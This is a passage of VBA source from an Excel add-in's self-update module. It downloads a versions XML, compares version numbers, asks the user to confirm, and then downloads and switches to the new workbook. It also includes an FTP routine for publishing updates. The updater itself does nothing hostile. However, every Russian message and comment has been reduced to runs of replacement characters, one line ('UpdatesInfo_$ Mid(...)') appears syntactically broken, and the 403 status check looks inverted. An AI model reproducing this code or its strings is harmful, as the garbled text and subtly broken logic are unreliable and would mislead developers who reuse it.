    pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...", " ": DoEvents: Application.ScreenUpdating = True
    Application.DisplayAlerts = False
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr tempPath$, vbNormal
    ' Kill tempPath$
    DeleteProgramCommandBar
    Application.DisplayAlerts = True
    Application.EnableEvents = True
    pi.Hide: DoEvents: Application.ScreenUpdating = True

    old_ver$ = GetVersionTXT(Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number")))
    new_ver$ = GetVersionTXT(Val(NewVersionWB.BuiltinDocumentProperties("Revision Number")))

    Application.Calculation = calc
    ND "update installed", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|! (" & old_ver$ & " -> " & new_ver$ & ")" & "   " & CountersCurrentValues
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|!", vbInformation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & old_ver$ & " -> " & new_ver$
    Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & OldFilePath$


    Application.DisplayAlerts = True
    Application.OnTime Now + TimeSerial(0, 0, 2), NewVersionWB.Name & "!Auto_Open"
    ThisWorkbook.Close False
End Sub

Sub InstallUpdate(ByVal UpdateLink$)
    On Error Resume Next
    Dim pi As New ProgressIndicator
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|"
    msg$ = "File: " & Mid(UpdateLink$, InStrRev(UpdateLink$, "/") + 1)
    ND "update start", msg$
    pi.StartNewAction 5, 20, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    SaveAddinToPermanentPath
    If ThisWorkbook.Path = "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        pi.Hide: DoEvents: Application.ScreenUpdating = True
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|", _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|!":
        ND "update error", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    If ThisWorkbook.ReadOnly Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        pi.Hide: DoEvents: Application.ScreenUpdating = True
        MsgBox "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, Excel |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.", _
               vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|!":
        ND "update error", "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|""." & vbNewLine & _
                           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, Excel |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        Exit Sub
    End If

    Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & UpdateLink$
    Dim res As Boolean

    FilenameForTemporaryFile$ = FWF.temp_filename
    pi.StartNewAction 20, 40, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", "|fffd||fffd||fffd||fffd||fffd||fffd|: " & UpdateLink$

    res = FWF.DownLoadFileFromURL(UpdateLink$, FilenameForTemporaryFile$)

    Err.Clear: TemporaryFileSize& = FileLen(FilenameForTemporaryFile$)

    If TemporaryFileSize& < 100 Or Not res Then
        pi.Hide: DoEvents: Application.ScreenUpdating = True
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & FilenameForTemporaryFile$
        msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & vbNewLine & FTP.GetLastError
        ND "update error", msg
        MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub
    End If
    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & FilenameForTemporaryFile$

    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & UpdateLink$ & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & FileOrFolderSize(FileLen(FilenameForTemporaryFile$)) & vbNewLine & _
          vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, _
              "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then
        pi.Hide: DoEvents: Application.ScreenUpdating = True
        Exit Sub
    End If

    SwitchToAnotherFile FilenameForTemporaryFile$, , True, pi
End Sub

Function FileOrFolderSize(ByVal s) As String
    Size = Fix(Val(s)):
    Select Case Size
        Case Is < 1000: FileOrFolderSize = Size & " |fffd||fffd||fffd||fffd|"
        Case Is < 10000: FileOrFolderSize = FormatNumber(Size / 1024, 1) & " |fffd||fffd|"
        Case Is < 1000000: FileOrFolderSize = FormatNumber(Size \ 1024, 0) & " |fffd||fffd|"
        Case Is < 10000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 1) & " M|fffd|"
        Case Is < 1000000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 0) & " |fffd||fffd|"
        Case Else: FileOrFolderSize = FormatNumber(Size / 1024 / 1024 / 1024, 1) & " |fffd||fffd|"
    End Select
End Function

Sub ManualInstallUpdate()
    On Error Resume Next: Err.Clear
    On Error Resume Next
    Update$ = CheckForAvailableUpdates
    If Len(Update$) = 0 Then Exit Sub
    If Update$ Like UPDATE_FOLDER$ & "*" Then InstallUpdate Update$
End Sub

Function AutoInstallUpdate()
    On Error Resume Next
    Update$ = CheckForAvailableUpdates
    If Len(Update$) = 0 Then Exit Function
    newVer = Val(Split(Update$, "_v")(1))

    If Not CBool(Val(RSP(5))) Then Exit Function
    msg$ = " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|" & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru" & vbNewLine & vbNewLine & _
         " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & GetVersionTXT() & vbNewLine & _
         " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & GetVersionTXT(newVer) & vbNewLine & vbNewLine & _
           vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
           vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
           vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & ""
    msg$ = msg$ & vbNewLine & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
           vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|"

    If Update$ Like UPDATE_FOLDER$ & "*" Then
        Select Case MsgBox(msg$, vbInformation + vbYesNoCancel + vbDefaultButton2, ttl$)
            Case vbYes        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                InstallUpdate Update$
            Case vbNo        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ND "update cancelled", CountersCurrentValues
                Exit Function
            Case vbCancel        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                WSP 5, 0
                ND "update deactivated", CountersCurrentValues
        End Select
    End If
End Function

Function CheckForAvailableUpdates(Optional ByRef UpdatesList As Variant) As String
    On Error Resume Next: Kill VERSIONS_INFO_LOCAL_XML_PATH$
    If Not DownloadVersionsInfo Then
        CheckForAvailableUpdates = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.": Exit Function
    End If

    Set xml = CreateObject("Microsoft.XMLDOM")
    If Dir(VERSIONS_INFO_LOCAL_XML_PATH$, vbNormal) = "" Then
        CheckForAvailableUpdates = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.": Exit Function
    End If

    xml.Load VERSIONS_INFO_LOCAL_XML_PATH$
    Set versions = xml.DocumentElement.SelectNodes("Version")

    ReDim arr(0 To versions.Length - 1, 0 To 5)

    VersionNumber& = GetVersion: VersionStableNumber& = GetVersion
    NewestUpdateLink$ = "": NewestStableUpdateLink$ = "": UpdateTXT$ = ""
    CurrentVersionName$ = GetVersionTXT(VersionNumber&)

    For i = 0 To versions.Length - 1
        Set n = versions.item(versions.Length - i - 1)
        arr(i, 0) = i + 1
        arr(i, 1) = n.SelectSingleNode("Date").Text
        arr(i, 2) = n.Attributes.getNamedItem("name").Text
        arr(i, 3) = n.SelectSingleNode("Number").Text
        arr(i, 4) = n.SelectSingleNode("Description").Text
        arr(i, 5) = n.SelectSingleNode("Link").Text

        ver& = Val(n.SelectSingleNode("Number").Text)
        Link$ = n.SelectSingleNode("Link").Text
        If ver Mod 10 = 0 Then ver = ver + 9        ' |fffd||fffd||fffd||fffd||fffd| alfa, beta |fffd| RC |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If ver& > GetVersion Then
            UpdatesCount& = UpdatesCount& + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

            UpdateTXT$ = UpdateTXT$ & "&&" & "|fffd||fffd||fffd||fffd||fffd||fffd| " & arr(i, 2) & " |fffd||fffd| " & arr(i, 1) & "==" & arr(i, 4)
        End If

        If ver& > VersionNumber& Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            VersionNumber& = ver&: If Len(Link$) Then NewestUpdateLink$ = Link$
        End If

        If ver& > VersionStableNumber& Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If ver Mod 10 = 9 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                VersionStableNumber& = ver&: If Len(Link$) Then NewestStableUpdateLink$ = Link$
            End If
        End If

    Next i
    UpdatesInfo_$ Mid(UpdateTXT$, 3)
    ' If Len(UpdateTXT$) Then CreateProgramCommandBar: DoEvents
    CreateProgramCommandBar

    If IsMissing(UpdatesList) Then
        CheckForAvailableUpdates = IIf(CBool(Val(RSP(6))), NewestStableUpdateLink$, NewestUpdateLink$)
    Else
        CurrentversionDate = ThisWorkbook.BuiltinDocumentProperties("Creation Date")
        CheckForAvailableUpdates = IIf(UpdatesCount&, _
                                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & UpdatesCount& & vbNewLine & "  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & CurrentVersionName$ & _
                                     " |fffd||fffd| " & CurrentversionDate & ")", _
                                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & vbNewLine & "(" & CurrentVersionName$ & _
                                     " |fffd||fffd| " & CurrentversionDate & ")")
        UpdatesList = arr
    End If
End Function

Function VersionsHistory() As String
    On Error Resume Next: Kill VERSIONS_INFO_LOCAL_XML_PATH$
    If Not DownloadVersionsInfo Then
        VersionsHistory = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                          vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                          "- |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|;" & vbNewLine & _
                          "- |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|;" & vbNewLine & _
                          "- |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        Exit Function
    End If
    Set xml = CreateObject("Microsoft.XMLDOM")
    If Dir(VERSIONS_INFO_LOCAL_XML_PATH$, vbNormal) = "" Then
        VersionsHistory = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                          vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If
    xml.Load VERSIONS_INFO_LOCAL_XML_PATH$
    For Each n In xml.DocumentElement.SelectNodes("Version")
        ver = n.Attributes.getNamedItem("name").Text
        If Len(ver) < 12 Then ver = ver & Space(12 - Len(ver))
        txt = txt & "|fffd||fffd||fffd||fffd||fffd||fffd| " & ver & vbTab & "(|fffd||fffd||fffd||fffd|: " & n.SelectSingleNode("Date").Text & _
              ";  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & n.SelectSingleNode("Number").Text & ")"
        descr$ = "   " & Replace(n.SelectSingleNode("Description").Text, vbLf, vbLf & "   ")
        txt = txt & vbNewLine & descr$ & vbNewLine & vbNewLine
    Next n
    txt = Mid(txt, 1, Len(txt) - 4)
    VersionsHistory = IIf(Len(txt), txt, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                                         "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|")
End Function

Function DownloadVersionsInfo() As Boolean
    If GetURLstatus(UPDATE_FOLDER$) <> "403" Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If DEBUG_MODE Then Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", UPDATE_FOLDER$
        Exit Function
    End If

    If Not FWF.DownLoadFileFromURL(UPDATE_VERSIONS_XML$, VERSIONS_INFO_LOCAL_XML_PATH$) Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML
        If DEBUG_MODE Then Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML", UPDATE_VERSIONS_XML$
        Exit Function
    End If
    DownloadVersionsInfo = True
End Function

Sub UploadNewVersion(ByVal LocalFilename$)
    On Error Resume Next: Err.Clear
    UpdateFolder$ = "updates/" & PROJECT_NAME$ & "/"
    Dim Link$

    If Not Application.Run("'CommonFunctions.xla'!Ready") Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If

    Link$ = Application.Run("'CommonFunctions.xla'!Publish_Update", PROJECT_NAME$, _
                            UpdateFolder$, VERSIONS_INFO_LOCAL_XML_PATH$, VERSIONS_XML_FILENAME$)

    If DEBUG_MODE Then Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Link$

    If Len(LocalFilename$) Then
        Link$ = "": Link$ = Application.Run("'CommonFunctions.xla'!Publish_Update", PROJECT_NAME$, _
                                            UpdateFolder$, LocalFilename$)
        If Len(Link$) = 0 Then
            If DEBUG_MODE Then Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| FTP: "
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| FTP" & vbNewLine, vbExclamation, _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            Exit Sub
        End If
        If DEBUG_MODE Then Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Link$
